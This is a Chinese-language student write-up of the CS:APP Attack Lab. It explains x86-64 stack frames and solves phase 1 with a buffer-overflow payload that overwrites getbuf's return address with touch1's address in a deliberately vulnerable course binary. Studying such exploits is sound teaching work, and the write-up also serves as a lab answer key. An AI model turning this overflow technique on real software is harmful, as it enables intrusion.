# Attack Lab

## x86-64的函数调用

x86-64 的函数调用过程，需要做的设置有：

- 调用者：
  - 为要保存的寄存器值及可选参数分配足够大控件的栈帧
  - 把所有调用者需要保存的寄存器存储在帧中
  - 把所有需要保存的可选参数按照逆序存入帧中
  - `call foo:` 会先把 `%rip` 保存到栈中，然后跳转到 label `foo`
- 被调用者
  - 把任何被调用者需要保存的寄存器值压栈减少 `%rsp` 的值以便为新的帧腾出空间

x86-64 的函数返回过程：

- 被调用者
  - 增加 `%rsp` 的计数，逆序弹出所有的被调用者保存的寄存器，执行 `ret: pop %rip`

### x86-64的栈帧

当过程P调用过程Q时，会把返回地址压入栈中，指明当Q返回时，要从P程序的哪个位置继续执行，把这个返回地址当作P的栈帧的一部分

## 具体任务

![img](.\img\AttackLabTasks.jpg)

因为没有课程网站的账号，所以只能通过`./ctarget -q`和`/rtarget -q`来进行实验

## phase_1

ctarget的正常流程是执行`test`

```c
void test() {
    int val;
    val = getbuf();
    printf("NO explit. Getbuf returned 0x%x\n", val);
}
```

```c
void touch1() {
    vlevel = 1;
    printf("Touch!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

为了使程序执行touch1函数，需要对getbuf函数进行缓冲区溢出攻击，将getbuf的返回值替换为touch1的实际地址0x4017c0

因为getbuf函数汇编代码如下

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

其缓冲区有40（0x28）字节，使用gdb运行getbuf时发现在getbuf的原返回地址后即为分配的缓冲区，因此只需使用40字节的任意内容加上小端表示的touch1函数地址0x4017c0即可，如下

```
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00
c0 17 40 00
```

然后再使用`./hex2raw`转换为ctarget能够读取的2进制文件即可
